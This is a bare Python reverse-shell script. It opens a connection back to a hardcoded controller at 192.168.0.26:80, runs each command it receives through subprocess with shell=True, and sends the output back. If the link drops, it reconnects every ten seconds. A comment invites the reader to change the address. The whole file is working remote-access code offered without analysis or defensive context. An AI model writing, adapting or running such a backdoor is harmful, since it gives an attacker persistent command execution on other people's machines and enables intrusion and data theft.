#!/usr/bin/python3

import subprocess
import socket
from time import sleep


ip = "192.168.0.26"
port = 80
connected = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def exec_command(command):
	try:
		proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,  stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		return result
	except Exception as error:
		return error


def rce():
	global connected
	global s
	
	while True:
		response = s.recv(1024)
		
		if response == b'':
			s.close()
			connected = False
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			break
			
		command_result = exec_command(response)
		s.send(command_result)


def connect_back():
	global connected

	while True:
		try:
			if connected:
				rce()
			else:
				s.connect((ip, port))	# change this
				connected = True
		except:
			sleep(10)
	
	
connect_back()
